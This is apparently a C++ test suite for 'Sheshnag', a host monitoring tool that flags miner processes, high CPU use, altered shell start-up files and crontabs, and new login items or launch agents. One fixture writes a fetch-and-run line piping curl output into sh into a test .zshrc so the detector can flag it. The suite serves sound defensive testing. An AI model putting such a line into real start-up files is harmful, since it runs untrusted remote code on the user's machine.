// Requirement coverage: FR-S-05 (miners / CPU), FR-S-06 (shell start-up + cron),
// FR-S-07 (login items), FR-S-08 (notifications), FR-S-10 (state files).
#include <gmock/gmock.h>

#include "test_support.h"

namespace sheshnag::qa {
namespace {

using ::testing::HasSubstr;
using ::testing::IsEmpty;
using ::testing::Not;

class ProcessDetectionTest : public SheshnagTest {
 protected:
  void SetUp() override {
    SheshnagTest::SetUp();
    ASSERT_EQ(Run({"baseline"}).exit_code, 0);
  }
  std::string Row(const std::string& cpu, const std::string& comm, const std::string& user = "") {
    return "4242 " + cpu + " " + (user.empty() ? CurrentUser() : user) + " " + comm + " " + comm;
  }
};

TEST_F(ProcessDetectionTest, FlagsAMinerByName) {
  SetProcesses({Row("5.0", "/tmp/xmrig")});

  const RunResult result = Run({"dekho"});

  EXPECT_EQ(result.exit_code, 1);
  EXPECT_THAT(result.output, HasSubstr("miner-like process 4242"));
}

TEST_F(ProcessDetectionTest, FlagsAUserProcessAboveThreeCores) {
  SetProcesses({Row("450.0", "/usr/local/bin/busy")});

  EXPECT_THAT(Run({"dekho"}).output, HasSubstr("is using 450.0% CPU"));
}

TEST_F(ProcessDetectionTest, DoesNotFlagExactlyThreeCores) {
  SetProcesses({Row("300.0", "/usr/local/bin/busy")});

  EXPECT_EQ(Run({"dekho"}).exit_code, 0);
}

TEST_F(ProcessDetectionTest, FlagsJustAboveThreeCores) {
  SetProcesses({Row("301.0", "/usr/local/bin/busy")});

  EXPECT_EQ(Run({"dekho"}).exit_code, 1);
}

TEST_F(ProcessDetectionTest, IgnoresAllowListedBuildTools) {
  SetProcesses({Row("800.0", "/Users/me/.cargo/bin/rustc"), Row("700.0", "/usr/bin/clang")});

  EXPECT_EQ(Run({"dekho"}).exit_code, 0);
}

TEST_F(ProcessDetectionTest, IgnoresHeavyProcessesOwnedByOtherUsers) {
  SetProcesses({Row("900.0", "/usr/local/bin/busy", "someoneelse")});

  EXPECT_EQ(Run({"dekho"}).exit_code, 0);
}

class StartupDetectionTest : public SheshnagTest {};

TEST_F(StartupDetectionTest, FlagsAPastedCurlPipeShellLineInZshrc) {
  WriteFile(home_ + "/.zshrc", "export A=1\n");
  Run({"baseline"});
  WriteFile(home_ + "/.zshrc", "export A=1\ncurl http://example.invalid/x | sh\n");

  const RunResult result = Run({"dekho"});

  EXPECT_EQ(result.exit_code, 1);
  EXPECT_THAT(result.output, HasSubstr("shell start-up file runs a pasted-style command"));
}

TEST_F(StartupDetectionTest, NotesAChangedStartupFileWithoutFlaggingBenignEdits) {
  WriteFile(home_ + "/.zshrc", "export A=1\n");
  Run({"baseline"});
  WriteFile(home_ + "/.zshrc", "export A=2\n");

  const RunResult result = Run({"dekho"});

  EXPECT_EQ(result.exit_code, 0);
  EXPECT_THAT(ActivityLog(), HasSubstr("shell start-up file changed"));
}

TEST_F(StartupDetectionTest, FlagsAChangedCrontab) {
  SetCrontab("0 * * * * /usr/bin/true\n");
  Run({"baseline"});
  SetCrontab("0 * * * * /usr/bin/true\n* * * * * /tmp/evil\n");

  const RunResult result = Run({"dekho"});

  EXPECT_EQ(result.exit_code, 1);
  EXPECT_THAT(result.output, HasSubstr("crontab changed"));
}

TEST_F(StartupDetectionTest, FlagsANewLoginItem) {
  SetLoginItems("Dropbox");
  Run({"baseline"});
  SetLoginItems("Dropbox, Unknown Helper");

  EXPECT_THAT(Run({"dekho"}).output, HasSubstr("new Login Item: Unknown Helper"));
}

TEST_F(StartupDetectionTest, DoesNotFlagARemovedLoginItem) {
  SetLoginItems("Dropbox, Slack");
  Run({"baseline"});
  SetLoginItems("Dropbox");

  EXPECT_EQ(Run({"dekho"}).exit_code, 0);
}

class NotificationTest : public SheshnagTest {
 protected:
  void SetUp() override {
    SheshnagTest::SetUp();
    AddUserAgent("com.example.known");
    ASSERT_EQ(Run({"baseline"}).exit_code, 0);
  }
};

TEST_F(NotificationTest, QuietModeIsSilentWhenNothingIsWrong) {
  const RunResult result = Run({"dekho", "quiet"});

  EXPECT_EQ(result.exit_code, 0);
  EXPECT_THAT(result.output, IsEmpty());
  EXPECT_THAT(StubCalls(), Not(HasSubstr("notify")));
}

TEST_F(NotificationTest, QuietModeNotifiesOnceForANewFinding) {
  AddUserAgent("com.example.intruder");

  Run({"dekho", "quiet"});
  Run({"dekho", "quiet"});

  const std::string calls = StubCalls();
  EXPECT_THAT(calls, HasSubstr("1 new finding(s)"));
  EXPECT_EQ(calls.find("notify"), calls.rfind("notify")) << "second look must not re-notify";
}

TEST_F(NotificationTest, InteractiveRunNeverNotifies) {
  AddUserAgent("com.example.intruder");

  Run({"dekho"});

  EXPECT_THAT(StubCalls(), Not(HasSubstr("notify")));
}

TEST_F(NotificationTest, WritesOnlyFindingLinesToTheStateFileTheDashboardReads) {
  AddUserAgent("com.example.intruder");

  Run({"dekho"});

  const std::string findings = Findings();
  EXPECT_THAT(findings, HasSubstr("!! launch agent NEW"));
  EXPECT_THAT(findings, Not(HasSubstr("Sheshnag:")));
  EXPECT_TRUE(Exists(state_ + "/findings.prev"));
}

}  // namespace
}  // namespace sheshnag::qa
